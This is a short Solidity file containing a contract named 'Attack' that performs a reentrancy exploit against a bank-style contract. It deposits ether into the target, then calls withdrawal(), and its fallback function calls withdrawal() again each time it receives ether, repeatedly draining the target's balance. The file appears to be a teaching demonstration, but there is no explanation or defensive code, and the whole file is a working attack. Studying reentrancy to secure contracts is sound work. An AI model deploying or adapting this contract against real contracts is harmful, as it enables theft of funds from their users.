// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';

interface BankInterface {
    function withdrawal(uint256 amount) external returns (bool);
    function save () external payable returns (bool);
}


contract Attack is Ownable{


    BankInterface bank;

    uint256 balance = 0;

    function setAddress(address _address) external onlyOwner{
        bank = BankInterface(_address);
    }

    function depositToThisContract() external payable{
        balance = msg.value;
    }

    function balanceOf() external view returns (uint256){
        return balance;
    }

    function attack(uint256 amount ) external {
        bank.withdrawal(amount);
    }

    function deposit() external{
        bank.save{value: 1*10**18}();
    }

    fallback() external payable{
        bank.withdrawal(1 * 10**18);
    }

}